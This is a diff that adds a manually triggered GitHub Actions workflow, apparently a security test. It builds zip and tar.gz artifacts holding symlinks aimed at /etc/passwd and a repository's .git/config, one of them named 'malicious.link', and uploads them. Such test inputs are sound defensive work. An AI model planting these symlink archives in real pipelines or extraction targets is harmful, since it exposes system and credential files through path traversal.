@@ -1,0 +1,24 @@
+name: Symlink Zip Test
+on: workflow_dispatch
+jobs:
+  upload:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          # Create symlink pointing to sensitive file
+          ln -s ../../../../etc/passwd malicious.link
+          
+          # Create symlink to .git directory
+          ln -s ../../../../.git/config git.link
+          
+          # Zip with symlinks preserved
+          zip --symlinks -r symlink-artifact.zip malicious.link git.link
+          
+          # Also create tar.gz
+          tar -czf symlink-artifact.tar.gz malicious.link git.link
+      - uses: actions/upload-artifact@v4
+        with:
+          name: symlink-test
+          path: |
+            symlink-artifact.zip
+            symlink-artifact.tar.gz
